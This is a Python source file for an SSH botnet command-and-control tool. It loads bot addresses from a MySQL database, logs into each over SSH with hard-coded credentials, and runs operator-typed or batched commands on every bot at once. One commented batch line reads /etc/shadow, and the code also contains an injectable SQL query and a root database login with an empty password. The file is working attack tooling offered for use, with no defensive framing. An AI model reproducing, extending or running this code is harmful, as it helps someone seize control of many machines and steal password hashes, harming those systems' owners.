# ssh-botnet.py

"""
Description:

A SSH botnet command and control program.

Interpreter mode    : Run commands from prompt
Batch mode          : Run pre-defined command(s), they can also be called from the 
                      interpreter mode by executing the command 'batch()'
                      (Not to be confused with the shell command 'batch')

For help with options run:
    $ python ssh-botnet.py -h

"""

import sys
import optparse
import pxssh
import MySQLdb
import threading

from termcolor import cprint
from progressbar import ProgressBar

# Global
botNet      = [] # Contains Client objects
botIP       = [] # Contains Bot IPs
botError    = [] # Contains Bot IPs that failed to connect

# Database connection strings
HOST        = "10.0.0.1"
USER        = "root"
PASSWORD    = ""
DB          = "ssh_botnet"
    
# Connect to database
db = MySQLdb.connect(host=HOST, user=USER, passwd=PASSWORD, db=DB)

# Create cursor object (this allows you to execute all the queries you need)
cur = db.cursor(MySQLdb.cursors.DictCursor)

# Thread lock
lock = threading.Lock()

class Client:
    def __init__(self, host, user, password):
        self.host       = host
        self.user       = user
        self.password   = password
        self.session    = self.connect()

    def connect(self):
        try:
            s = pxssh.pxssh()
            s.login(self.host, self.user, self.password)
            return s
        except Exception, e:
            #print e
            # Update bot status
            update = "UPDATE bot_ip SET status=0 WHERE ip='" + self.host + "'" 
            cur.execute(update)
            db.commit()

    def send_command(self, cmd):
        self.session.sendline(cmd)
        self.session.prompt()
        return self.session.before

# Creates and adds a Client object to global botnet list
def addClient(host, user, password):
    client = Client(host, user, password)
    if client.session != None:
        botNet.append(client)
    else:
        botError.append(host)

# Execute the given command for each Client in global botnet list
def botnetCommand(command):
    threads = []

    # Create a thread for each bot to execute the command
    for client in botNet:
        t = threading.Thread(target=sendCommand, args=(client, command))
        threads.append(t)
        t.start()

    # Wait until all threads are finished
    for thread in threads:
        thread.join()

# Multi-thread send command to each bot
def sendCommand(client, command):
    output = client.send_command(command)

    # Make the following lines atomic instructions
    with lock:
        cprint("[*] Output from " + client.host, "cyan")
        print "[+]", output

# Batch mode - create a list of predefined commands to execute
def batch():
    #botnetCommand("uname -v")
    #botnetCommand("sudo cat /etc/shadow | grep $(whoami)")
    botnetCommand("ifconfig | grep inet")

# Interpreter mode - user types each command in a prompt
def imode():
    while 1:
        command = raw_input("SSH Botnet C&C > ")
        if command == "exit":
            exit(0)
        elif command == "batch()":
            batch()
        else:
            botnetCommand(command)

# Check bot status and add to connection list if active
def init_botIP():
    select = "SELECT * FROM bot_ip"
    cur.execute(select)
    for row in cur.fetchall():
        if row["status"] == 1: 
            botIP.append(row["ip"])

    cprint("[*] Bot IP list:", "yellow")
    print "[%s]" % ", ".join(map(str, botIP))

def main():
    # Options parser
    parser = optparse.OptionParser()
    parser.add_option("-i", "--interpreter", \
                      help="run in interpreter mode", \
		      dest="IMODE", default=False, \
		      action="store_true"
		     )
    (opts, args) = parser.parse_args()

    print "SSH Botnet Master Tool v1.2\n"

    # Initialize botIP list
    init_botIP()

    # Show progress bar
    pbar = ProgressBar()

    # Initialize botnet clients
    cprint("\n[*] Connecting...", "green")
    for ip in pbar(botIP):
        addClient(ip, "bot", "password")
    
    # Report connection failures
    for ip in botError:
        cprint("[-] Error connecting to " + ip, "red")

    print ""

    # Send command to all the clients
    if opts.IMODE:
        imode()
    else:
        batch()

if __name__ == "__main__":
    main()

